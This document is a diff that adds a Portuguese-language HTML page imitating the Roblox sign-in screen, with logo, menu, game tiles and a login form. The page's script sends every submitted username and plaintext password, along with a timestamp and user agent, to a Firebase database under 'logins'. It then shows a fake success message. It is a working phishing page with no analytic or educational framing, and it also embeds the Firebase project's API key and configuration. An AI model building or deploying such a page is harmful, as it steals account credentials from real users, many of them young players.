@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar na Roblox</title>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #000 url('Cavalo.jpg') center/cover no-repeat fixed;
+            color: #fff;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 0;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 2rem;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            position: relative;
+            z-index: 20;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        .logo {
+            font-size: 1.875rem;
+            font-weight: 900;
+            letter-spacing: 0.05em;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.5rem;
+        }
+
+        .nav-links a {
+            color: #fff;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #d1d5db;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .search-box {
+            position: relative;
+        }
+
+        .search-box input {
+            background: #1f2937;
+            color: #fff;
+            padding: 0.5rem 1rem 0.5rem 2.5rem;
+            border: none;
+            border-radius: 0.5rem;
+            outline: none;
+        }
+
+        .search-box input:focus {
+            box-shadow: 0 0 0 2px #3b82f6;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 0.75rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+        }
+
+        .btn {
+            padding: 0.5rem 1.5rem;
+            border: none;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: #2563eb;
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            background: #1d4ed8;
+        }
+
+        .btn-secondary {
+            background: #1f2937;
+            color: #fff;
+        }
+
+        .btn-secondary:hover {
+            background: #374151;
+        }
+
+        /* Background Animation */
+        .background {
+            position: fixed;
+            inset: 0;
+            overflow: hidden;
+            z-index: 1;
+            display: none;
+        }
+
+        .game-card {
+            position: absolute;
+            width: 12rem;
+            height: 16rem;
+            border-radius: 0.5rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            opacity: 0.3;
+            transition: transform 0.3s;
+            animation: float 20s ease-in-out infinite;
+        }
+
+        .game-card:hover {
+            transform: scale(1.05) !important;
+        }
+
+        .game-card-content {
+            padding: 1rem;
+            height: 100%;
+            display: flex;
+            align-items: flex-end;
+        }
+
+        .game-card-title {
+            color: #fff;
+            font-weight: 700;
+            font-size: 1.25rem;
+            text-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+        }
+
+        /* Login Container */
+        .login-container {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 80px);
+            padding: 1rem;
+        }
+
+        .login-card {
+            background: rgba(17, 24, 39, 0.95);
+            backdrop-filter: blur(12px);
+            border-radius: 1rem;
+            padding: 2rem;
+            width: 100%;
+            max-width: 28rem;
+            border: 1px solid #374151;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .login-title {
+            font-size: 1.875rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
+
+        .form-input {
+            width: 100%;
+            background: #1f2937;
+            color: #fff;
+            padding: 0.75rem 1rem;
+            border: none;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .form-input:focus {
+            box-shadow: 0 0 0 2px #3b82f6;
+        }
+
+        .form-input::placeholder {
+            color: #6b7280;
+        }
+
+        .btn-full {
+            width: 100%;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+        }
+
+        .btn-outline {
+            background: #1f2937;
+            border: 1px solid #374151;
+        }
+
+        .btn-outline:hover {
+            background: #374151;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .link {
+            color: #60a5fa;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .link:hover {
+            color: #93c5fd;
+        }
+
+        .text-sm {
+            font-size: 0.875rem;
+        }
+
+        .text-gray {
+            color: #9ca3af;
+        }
+
+        .mt-4 {
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <nav class="header">
+        <div class="header-left">
+            <div class="logo">ROBLOX</div>
+            <div class="nav-links">
+                <a href="#">Destaques</a>
+                <a href="#">Mercado</a>
+                <a href="#">Criar</a>
+                <a href="#">Robux</a>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="search-box">
+                <svg class="search-icon" width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+                </svg>
+                <input type="text" placeholder="Pesquisar">
+            </div>
+            <button class="btn btn-primary">Cadastrar-se</button>
+            <button class="btn btn-secondary">Entrar</button>
+        </div>
+    </nav>
+
+    <!-- Animated Background -->
+    <div class="background">
+        <div class="game-card" style="left: 5%; top: 10%; transform: rotate(-15deg); background: linear-gradient(135deg, #7f1d1d, #991b1b);">
+            <div class="game-card-content">
+                <div class="game-card-title">MIMIC</div>
+            </div>
+        </div>
+        <div class="game-card" style="left: 25%; top: 5%; transform: rotate(10deg); background: linear-gradient(135deg, #2563eb, #60a5fa);">
+            <div class="game-card-content">
+                <div class="game-card-title">JAILBREAK</div>
+            </div>
+        </div>
+        <div class="game-card" style="left: 50%; top: 15%; transform: rotate(-20deg); background: linear-gradient(135deg, #0891b2, #22d3ee);">
+            <div class="game-card-content">
+                <div class="game-card-title">SHARK</div>
+            </div>
+        </div>
+        <div class="game-card" style="left: 70%; top: 8%; transform: rotate(25deg); background: linear-gradient(135deg, #9a3412, #ea580c);">
+            <div class="game-card-content">
+                <div class="game-card-title">DOORS</div>
+            </div>
+        </div>
+        <div class="game-card" style="left: 15%; top: 60%; transform: rotate(15deg); background: linear-gradient(135deg, #059669, #34d399);">
+            <div class="game-card-content">
+                <div class="game-card-title">TOWER</div>
+            </div>
+        </div>
+        <div class="game-card" style="left: 35%; top: 70%; transform: rotate(-10deg); background: linear-gradient(135deg, #ec4899, #f9a8d4);">
+            <div class="game-card-content">
+                <div class="game-card-title">ADOPT ME!</div>
+            </div>
+        </div>
+        <div class="game-card" style="left: 60%; top: 65%; transform: rotate(20deg); background: linear-gradient(135deg, #b91c1c, #ea580c);">
+            <div class="game-card-content">
+                <div class="game-card-title">PRIMAL HUNT</div>
+            </div>
+        </div>
+        <div class="game-card" style="left: 80%; top: 55%; transform: rotate(-25deg); background: linear-gradient(135deg, #7c3aed, #a78bfa);">
+            <div class="game-card-content">
+                <div class="game-card-title">HEROES</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Card -->
+    <div class="login-container">
+        <div class="login-card">
+            <h2 class="login-title">Entrar na Roblox</h2>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="username" class="form-input" placeholder="Usuário/e-mail/telefone" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" class="form-input" placeholder="Senha" required>
+                </div>
+                
+                <button type="submit" class="btn btn-secondary btn-full">Entrar</button>
+                
+                <div class="text-center form-group">
+                    <a href="#" class="link text-sm">Esqueceu a senha ou nome de usuário?</a>
+                </div>
+                
+                <button type="button" class="btn btn-outline btn-full">
+                    Envie-me um código único por e-mail
+                </button>
+                
+                <button type="button" class="btn btn-outline btn-full">
+                    Use outro dispositivo
+                </button>
+                
+                <div class="text-center mt-4">
+                    <span class="text-gray text-sm">Não possui uma conta? </span>
+                    <a href="#" class="link text-sm">Cadastrar-se</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Configuração do Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDx_z4-ZVorAyYgWxYZn2YGwm4xINiSf-c",
+            authDomain: "roblox-843e6.firebaseapp.com",
+            databaseURL: "https://roblox-843e6-default-rtdb.firebaseio.com",
+            projectId: "roblox-843e6",
+            storageBucket: "roblox-843e6.firebasestorage.app",
+            messagingSenderId: "589419806856",
+            appId: "1:589419806856:web:e8fcbc48ddb50693a19f3d"
+        };
+
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Capturar o formulário
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Criar objeto com os dados
+            const loginData = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            
+            // Salvar no Firebase
+            database.ref('logins').push(loginData)
+                .then(() => {
+                    console.log('Dados salvos com sucesso!');
+                    alert('Login processado com sucesso!');
+                    // Limpar formulário
+                    document.getElementById('loginForm').reset();
+                })
+                .catch((error) => {
+                    console.error('Erro ao salvar dados:', error);
+                    alert('Erro ao processar login. Tente novamente.');
+                });
+        });
+    </script>
+</body>
+</html>
